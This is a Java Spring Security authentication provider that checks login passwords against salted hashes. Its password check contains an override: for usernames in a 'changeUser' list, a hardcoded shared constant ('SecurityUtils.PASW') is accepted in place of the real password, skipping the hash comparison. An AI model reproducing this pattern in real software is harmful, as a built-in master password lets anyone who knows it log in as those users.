package com.slzh.config.security;

import com.slzh.utils.login.PasswordEncoder;
import com.slzh.utils.login.SecurityUtils;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;


/**
 * 身份验证提供者
 * @author lanb
 * @date Jan 14, 2019
 */
public class JwtAuthenticationProvider extends DaoAuthenticationProvider {

    public JwtAuthenticationProvider(UserDetailsService userDetailsService) {
        setUserDetailsService(userDetailsService);
    }

    @Override
	protected void additionalAuthenticationChecks(UserDetails userDetails, UsernamePasswordAuthenticationToken authentication)
			throws AuthenticationException {
		if (authentication.getCredentials() == null) {
			logger.warn("Authentication failed: no credentials provided");
			throw new BadCredentialsException(messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
		}

		String presentedPassword = authentication.getCredentials().toString();
		String salt = ((JwtUserDetails) userDetails).getSalt();

		// 覆写密码验证逻辑
		if(SecurityUtils.changeUser.contains(userDetails.getUsername())){
			String userName = SecurityUtils.getUsername();
			if(userName!=null && userName.equals(userDetails.getUsername())){
				if(presentedPassword.equals(SecurityUtils.PASW)){
					return;
				}
			}
		}

			if (!new PasswordEncoder(salt).matches(userDetails.getPassword(), presentedPassword)) {
				logger.warn("Authentication failed: password does not match stored value");
				throw new BadCredentialsException(messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
			}







	}

}